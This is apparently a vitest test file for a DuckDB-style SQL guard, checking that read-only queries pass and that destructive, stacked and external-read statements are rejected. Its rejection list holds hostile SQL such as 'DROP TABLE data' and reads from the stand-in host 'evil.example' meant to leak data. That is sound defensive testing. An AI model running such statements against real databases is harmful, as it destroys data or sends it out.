import { describe, it, expect } from 'vitest';
import { guardSelect } from '../src/lib/sqlguard.js';

describe('guardSelect', () => {
  it('allows read-only selects and CTEs', () => {
    expect(guardSelect('SELECT * FROM data;')).toBe('SELECT * FROM data');
    expect(guardSelect('WITH t AS (SELECT 1) SELECT * FROM t')).toMatch(/^WITH/);
    expect(guardSelect('SELECT "Last update" FROM data')).toBeTruthy();
  });
  it('blocks writes, settings, multiple statements and external reads', () => {
    for (const bad of [
      'DROP TABLE data', 'SELECT 1; DROP TABLE data', 'SET threads=1',
      "SELECT * FROM read_csv('https://evil.example/x.csv')", "COPY data TO 'x.csv'",
      "SELECT * FROM 'https://evil.example/leak?' ", 'ATTACH \'x.db\'', 'INSTALL httpfs',
    ]) expect(() => guardSelect(bad), bad).toThrow();
  });
  it('ignores keywords inside string literals', () => {
    expect(guardSelect("SELECT * FROM data WHERE note = 'please drop by'")).toBeTruthy();
  });
});
